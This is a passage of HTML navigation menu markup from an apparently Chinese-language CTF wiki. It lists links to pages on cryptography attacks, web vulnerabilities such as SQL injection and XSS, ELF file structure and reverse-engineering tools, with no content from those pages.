Simon and Speck Block Ciphers </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-7 type=checkbox id=nav-4-5-7> <label class=md-nav__link for=nav-4-5-7> 分組模式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=分組模式 data-md-level=3> <label class=md-nav__title for=nav-4-5-7> <span class="md-nav__icon md-icon"></span> 分組模式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/introduction/ class=md-nav__link> 分組模式 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/padding/ class=md-nav__link> 填充方式 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/ecb/ class=md-nav__link> ECB </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/cbc/ class=md-nav__link> CBC </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/pcbc/ class=md-nav__link> PCBC </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/cfb/ class=md-nav__link> CFB </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/ofb/ class=md-nav__link> OFB </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/ctr/ class=md-nav__link> CTR </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/blockcipher/mode/padding-oracle-attack/ class=md-nav__link> Padding Oracle Attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6 type=checkbox id=nav-4-6> <label class=md-nav__link for=nav-4-6> 非對稱加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=非對稱加密 data-md-level=2> <label class=md-nav__title for=nav-4-6> <span class="md-nav__icon md-icon"></span> 非對稱加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/introduction/ class=md-nav__link> 介紹 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2 type=checkbox id=nav-4-6-2> <label class=md-nav__link for=nav-4-6-2> RSA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=RSA data-md-level=3> <label class=md-nav__title for=nav-4-6-2> <span class="md-nav__icon md-icon"></span> RSA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_theory/ class=md-nav__link> RSA 介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_module_attack/ class=md-nav__link> 模數相關攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_e_attack/ class=md-nav__link> 公鑰指數相關攻擊 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-2-4 type=checkbox id=nav-4-6-2-4> <label class=md-nav__link for=nav-4-6-2-4> 私鑰d相關攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=私鑰d相關攻擊 data-md-level=4> <label class=md-nav__title for=nav-4-6-2-4> <span class="md-nav__icon md-icon"></span> 私鑰d相關攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_d_attack/ class=md-nav__link> 私鑰 d 相關攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/ class=md-nav__link> 擴展維納攻擊 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack/ class=md-nav__link> Coppersmith 相關攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/ class=md-nav__link> RSA 選擇明密文攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_side_channel/ class=md-nav__link> RSA 側信道攻擊 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_pkcs_attack/ class=md-nav__link> Bleichenbacher's attack </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/rsa/rsa_complex/ class=md-nav__link> RSA 複雜題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-3 type=checkbox id=nav-4-6-3> <label class=md-nav__link for=nav-4-6-3> 揹包加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=揹包加密 data-md-level=3> <label class=md-nav__title for=nav-4-6-3> <span class="md-nav__icon md-icon"></span> 揹包加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/knapsack/knapsack/ class=md-nav__link> 揹包加密 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-4 type=checkbox id=nav-4-6-4> <label class=md-nav__link for=nav-4-6-4> 離散對數相關 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=離散對數相關 data-md-level=3> <label class=md-nav__title for=nav-4-6-4> <span class="md-nav__icon md-icon"></span> 離散對數相關 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/discrete-log/discrete-log/ class=md-nav__link> 離散對數 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/discrete-log/elgamal/ class=md-nav__link> ElGamal </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/discrete-log/ecc/ class=md-nav__link> ECC </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-6-5 type=checkbox id=nav-4-6-5> <label class=md-nav__link for=nav-4-6-5> 格密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格密碼 data-md-level=3> <label class=md-nav__title for=nav-4-6-5> <span class="md-nav__icon md-icon"></span> 格密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/overview/ class=md-nav__link> 格概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/introduction/ class=md-nav__link> 基本介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/lattice-reduction/ class=md-nav__link> 格基規約算法 </a> </li> <li class=md-nav__item> <a href=../../../../../../crypto/asymmetric/lattice/cvp/ class=md-nav__link> CVP </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7 type=checkbox id=nav-4-7> <label class=md-nav__link for=nav-4-7> 哈希函數 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=哈希函數 data-md-level=2> <label class=md-nav__title for=nav-4-7> <span class="md-nav__icon md-icon"></span> 哈希函數 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/introduction/ class=md-nav__link> 哈希函數 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-2 type=checkbox id=nav-4-7-2> <label class=md-nav__link for=nav-4-7-2> MD5 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MD5 data-md-level=3> <label class=md-nav__title for=nav-4-7-2> <span class="md-nav__icon md-icon"></span> MD5 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/md5/ class=md-nav__link> MD5 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-3 type=checkbox id=nav-4-7-3> <label class=md-nav__link for=nav-4-7-3> SHA1 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SHA1 data-md-level=3> <label class=md-nav__title for=nav-4-7-3> <span class="md-nav__icon md-icon"></span> SHA1 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/sha1/ class=md-nav__link> SHA1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-4 type=checkbox id=nav-4-7-4> <label class=md-nav__link for=nav-4-7-4> FNV <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=FNV data-md-level=3> <label class=md-nav__title for=nav-4-7-4> <span class="md-nav__icon md-icon"></span> FNV </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/fnv/ class=md-nav__link> Fowler–Noll–Vo hash function </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-7-5 type=checkbox id=nav-4-7-5> <label class=md-nav__link for=nav-4-7-5> Hash Attack <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hash Attack" data-md-level=3> <label class=md-nav__title for=nav-4-7-5> <span class="md-nav__icon md-icon"></span> Hash Attack </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/hash/attack/ class=md-nav__link> Hash Attack </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../crypto/hash/complex/ class=md-nav__link> 綜合題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8 type=checkbox id=nav-4-8> <label class=md-nav__link for=nav-4-8> 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=數字簽名 data-md-level=2> <label class=md-nav__title for=nav-4-8> <span class="md-nav__icon md-icon"></span> 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/introduction/ class=md-nav__link> 數字簽名 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-2 type=checkbox id=nav-4-8-2> <label class=md-nav__link for=nav-4-8-2> RSA 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="RSA 數字簽名" data-md-level=3> <label class=md-nav__title for=nav-4-8-2> <span class="md-nav__icon md-icon"></span> RSA 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/rsa/ class=md-nav__link> RSA 數字簽名 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-3 type=checkbox id=nav-4-8-3> <label class=md-nav__link for=nav-4-8-3> ElGamal 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ElGamal 數字簽名" data-md-level=3> <label class=md-nav__title for=nav-4-8-3> <span class="md-nav__icon md-icon"></span> ElGamal 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/elgamal/ class=md-nav__link> ElGamal </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-8-4 type=checkbox id=nav-4-8-4> <label class=md-nav__link for=nav-4-8-4> DSA 數字簽名 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="DSA 數字簽名" data-md-level=3> <label class=md-nav__title for=nav-4-8-4> <span class="md-nav__icon md-icon"></span> DSA 數字簽名 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/signature/dsa/ class=md-nav__link> DSA </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9 type=checkbox id=nav-4-9> <label class=md-nav__link for=nav-4-9> 攻擊思想總結 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=攻擊思想總結 data-md-level=2> <label class=md-nav__title for=nav-4-9> <span class="md-nav__icon md-icon"></span> 攻擊思想總結 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/attack-summary/attack-mode/ class=md-nav__link> 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-2 type=checkbox id=nav-4-9-2> <label class=md-nav__link for=nav-4-9-2> 中間相遇攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=中間相遇攻擊 data-md-level=3> <label class=md-nav__title for=nav-4-9-2> <span class="md-nav__icon md-icon"></span> 中間相遇攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/attack-summary/meet-in-the-middle/ class=md-nav__link> 中間相遇攻擊 - MITM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-9-3 type=checkbox id=nav-4-9-3> <label class=md-nav__link for=nav-4-9-3> 比特攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=比特攻擊 data-md-level=3> <label class=md-nav__title for=nav-4-9-3> <span class="md-nav__icon md-icon"></span> 比特攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/attack-summary/bit-attack/ class=md-nav__link> 比特攻擊 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-10 type=checkbox id=nav-4-10> <label class=md-nav__link for=nav-4-10> 證書格式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=證書格式 data-md-level=2> <label class=md-nav__title for=nav-4-10> <span class="md-nav__icon md-icon"></span> 證書格式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../crypto/certificate/introduction/ class=md-nav__link> 證書格式 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5 type=checkbox id=nav-5> <label class=md-nav__link for=nav-5> Web <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Web data-md-level=1> <label class=md-nav__title for=nav-5> <span class="md-nav__icon md-icon"></span> Web </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/introduction/ class=md-nav__link> Web 簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-2 type=checkbox id=nav-5-2> <label class=md-nav__link for=nav-5-2> SQL 注入 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SQL 注入" data-md-level=2> <label class=md-nav__title for=nav-5-2> <span class="md-nav__icon md-icon"></span> SQL 注入 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/sqli/ class=md-nav__link> SQL 注入 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-3 type=checkbox id=nav-5-3> <label class=md-nav__link for=nav-5-3> XSS 跨站腳本攻擊 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="XSS 跨站腳本攻擊" data-md-level=2> <label class=md-nav__title for=nav-5-3> <span class="md-nav__icon md-icon"></span> XSS 跨站腳本攻擊 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/xss/ class=md-nav__link> XSS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-4 type=checkbox id=nav-5-4> <label class=md-nav__link for=nav-5-4> CSRF 跨站請求僞造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="CSRF 跨站請求僞造" data-md-level=2> <label class=md-nav__title for=nav-5-4> <span class="md-nav__icon md-icon"></span> CSRF 跨站請求僞造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/csrf/ class=md-nav__link> CSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-5 type=checkbox id=nav-5-5> <label class=md-nav__link for=nav-5-5> SSRF 服務端請求僞造 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="SSRF 服務端請求僞造" data-md-level=2> <label class=md-nav__title for=nav-5-5> <span class="md-nav__icon md-icon"></span> SSRF 服務端請求僞造 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/ssrf/ class=md-nav__link> SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5-6 type=checkbox id=nav-5-6> <label class=md-nav__link for=nav-5-6> PHP 代碼審計 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="PHP 代碼審計" data-md-level=2> <label class=md-nav__title for=nav-5-6> <span class="md-nav__icon md-icon"></span> PHP 代碼審計 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../web/php/php/ class=md-nav__link> PHP 代碼審計 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-6 type=checkbox id=nav-6> <label class=md-nav__link for=nav-6> Assembly <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Assembly data-md-level=1> <label class=md-nav__title for=nav-6> <span class="md-nav__icon md-icon"></span> Assembly </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../assembly/x86-x64/readme/ class=md-nav__link> x86_x64 </a> </li> <li class=md-nav__item> <a href=../../../../../../assembly/mips/readme/ class=md-nav__link> MIPS </a> </li> <li class=md-nav__item> <a href=../../../../../../assembly/arm/readme/ class=md-nav__link> ARM </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7 type=checkbox id=nav-7> <label class=md-nav__link for=nav-7> Executable <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Executable data-md-level=1> <label class=md-nav__title for=nav-7> <span class="md-nav__icon md-icon"></span> Executable </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1 type=checkbox id=nav-7-1> <label class=md-nav__link for=nav-7-1> ELF 文件 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件" data-md-level=2> <label class=md-nav__title for=nav-7-1> <span class="md-nav__icon md-icon"></span> ELF 文件 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-1 type=checkbox id=nav-7-1-1> <label class=md-nav__link for=nav-7-1-1> ELF 文件基本結構 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="ELF 文件基本結構" data-md-level=3> <label class=md-nav__title for=nav-7-1-1> <span class="md-nav__icon md-icon"></span> ELF 文件基本結構 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/basic-info/ class=md-nav__link> ELF 文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/sections/ class=md-nav__link> Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/code-sections/ class=md-nav__link> Code Section </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/data-related-sections/ class=md-nav__link> Data Related Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/symbol-table/ class=md-nav__link> .symtab: Symbol Table </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/strings-sections/ class=md-nav__link> String Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/dynamic-sections/ class=md-nav__link> Dynamic Sections </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/structure/misc-sections/ class=md-nav__link> Misc Sections </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-2 type=checkbox id=nav-7-1-2> <label class=md-nav__link for=nav-7-1-2> 程序加載 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序加載 data-md-level=3> <label class=md-nav__title for=nav-7-1-2> <span class="md-nav__icon md-icon"></span> 程序加載 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/program-loading/ class=md-nav__link> 程序加載 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-3 type=checkbox id=nav-7-1-3> <label class=md-nav__link for=nav-7-1-3> 程序鏈接 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序鏈接 data-md-level=3> <label class=md-nav__title for=nav-7-1-3> <span class="md-nav__icon md-icon"></span> 程序鏈接 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/linking/program-linking/ class=md-nav__link> 程序鏈接 </a> </li> <li class=md-nav__item> <a href=../../../../../../executable/elf/linking/symbol-resolve/ class=md-nav__link> Symbol Reslove </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-7-1-4 type=checkbox id=nav-7-1-4> <label class=md-nav__link for=nav-7-1-4> 程序執行流程 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=程序執行流程 data-md-level=3> <label class=md-nav__title for=nav-7-1-4> <span class="md-nav__icon md-icon"></span> 程序執行流程 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../executable/elf/running-overview/ class=md-nav__link> 程序執行流程 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8 type=checkbox id=nav-8> <label class=md-nav__link for=nav-8> Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Reverse data-md-level=1> <label class=md-nav__title for=nav-8> <span class="md-nav__icon md-icon"></span> Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-1 type=checkbox id=nav-8-1> <label class=md-nav__link for=nav-8-1> Reverse Overview <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Reverse Overview" data-md-level=2> <label class=md-nav__title for=nav-8-1> <span class="md-nav__icon md-icon"></span> Reverse Overview </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/introduction/ class=md-nav__link> 軟件逆向工程簡介 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2 type=checkbox id=nav-8-2> <label class=md-nav__link for=nav-8-2> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=2> <label class=md-nav__title for=nav-8-2> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-1 type=checkbox id=nav-8-2-1> <label class=md-nav__link for=nav-8-2-1> 靜態分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=靜態分析 data-md-level=3> <label class=md-nav__title for=nav-8-2-1> <span class="md-nav__icon md-icon"></span> 靜態分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/ida/ class=md-nav__link> IDA Pro </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/ghidra/ class=md-nav__link> Ghidra </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/jadx/ class=md-nav__link> jadx </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/static-analyze/dnspy/ class=md-nav__link> Dnspy </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-2 type=checkbox id=nav-8-2-2> <label class=md-nav__link for=nav-8-2-2> 動態調試 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=動態調試 data-md-level=3> <label class=md-nav__title for=nav-8-2-2> <span class="md-nav__icon md-icon"></span> 動態調試 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/gdb/ class=md-nav__link> gdb </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/ollydbg/ class=md-nav__link> ollydbg </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/xdbg/ class=md-nav__link> x64dbg/x32dbg </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/debug/windbg/ class=md-nav__link> windbg </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-3 type=checkbox id=nav-8-2-3> <label class=md-nav__link for=nav-8-2-3> 約束求解 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=約束求解 data-md-level=3> <label class=md-nav__title for=nav-8-2-3> <span class="md-nav__icon md-icon"></span> 約束求解 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/constraint/z3/ class=md-nav__link> z3 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-2-4 type=checkbox id=nav-8-2-4> <label class=md-nav__link for=nav-8-2-4> 模擬執行 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=模擬執行 data-md-level=3> <label class=md-nav__title for=nav-8-2-4> <span class="md-nav__icon md-icon"></span> 模擬執行 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/tools/simulate-execution/angr/ class=md-nav__link> angr </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/tools/simulate-execution/unicorn/ class=md-nav__link> Unicorn Engine </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-3 type=checkbox id=nav-8-3> <label class=md-nav__link for=nav-8-3> 算法逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=算法逆向 data-md-level=2> <label class=md-nav__title for=nav-8-3> <span class="md-nav__icon md-icon"></span> 算法逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/identify-encode-encryption/introduction/ class=md-nav__link> 常見加密算法和編碼識別 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-4 type=checkbox id=nav-8-4> <label class=md-nav__link for=nav-8-4> 代碼混淆 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=代碼混淆 data-md-level=2> <label class=md-nav__title for=nav-8-4> <span class="md-nav__icon md-icon"></span> 代碼混淆 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/smc/ class=md-nav__link> Self-Modified Code </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/control-flow-flatten/ class=md-nav__link> 控制流平坦化 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/obfuscate/movfuscator/ class=md-nav__link> movofuscator </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-5 type=checkbox id=nav-8-5> <label class=md-nav__link for=nav-8-5> 迷宮逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=迷宮逆向 data-md-level=2> <label class=md-nav__title for=nav-8-5> <span class="md-nav__icon md-icon"></span> 迷宮逆向 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/maze/maze/ class=md-nav__link> 迷宮問題 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-6 type=checkbox id=nav-8-6> <label class=md-nav__link for=nav-8-6> 虛擬機逆向 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=虛擬機逆向 data-md-level=2> <label class=md-nav__title for=nav-8-6> <span class="md-nav__icon md-icon"></span> 虛擬機逆向 </label> <ul 